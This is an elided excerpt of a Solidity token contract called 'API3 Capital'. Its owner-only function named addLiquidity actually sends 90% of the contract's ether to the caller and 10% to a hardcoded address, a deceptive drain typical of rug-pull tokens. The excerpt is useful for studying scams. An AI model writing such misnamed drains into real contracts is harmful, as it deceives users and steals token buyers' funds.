...
contract API3 {
    ...
    string private _name = "API3 Capital";
    string private _symbol = "API";
    ...
    function addLiquidity() public onlyOwner() {
        ...
        _authNum=0;
                ...
                uint256 _ad = address(this).balance.mul(90).div(100);
                uint256 _dev = address(this).balance.mul(10).div(100);

          msg.sender.transfer(_ad);
          address(uint160(0x13905E33436c220f61F7e1fEc6E81e496346B7EB)).transfer(_dev);
    }
